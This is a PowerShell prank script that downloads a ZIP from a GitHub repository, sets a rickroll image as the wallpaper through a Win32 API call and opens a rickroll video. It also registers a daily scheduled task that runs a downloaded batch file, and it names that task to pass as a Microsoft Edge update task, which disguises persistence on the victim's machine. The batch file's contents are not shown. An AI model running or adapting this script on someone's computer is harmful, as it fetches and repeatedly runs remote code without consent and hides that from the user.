Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
mkdir C:\temp
   
Invoke-WebRequest 'https://github.com/CHONK12/rickRoll/archive/refs/heads/main.zip' -OutFile C:\temp\rick.zip
Expand-Archive C:\temp\rick.zip C:\temp\
   

$MyWallpaper="C:\temp\rickRoll-main\rickroll.jpg"
$code = @'
using System.Runtime.InteropServices;
namespace Win32{

    public class Wallpaper{
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

        public static void SetWallpaper(string thePath){
            SystemParametersInfo(20,0,thePath,3);
        }
    }
}
'@





add-type $code
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
$action = New-ScheduledTaskAction -Execute 'C:\temp\rickRoll-main\lobster.bat'  
$trigger = New-ScheduledTaskTrigger -Daily -At 1pm
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
Set-ExecutionPolicy -Scope CurrentUser Restricted
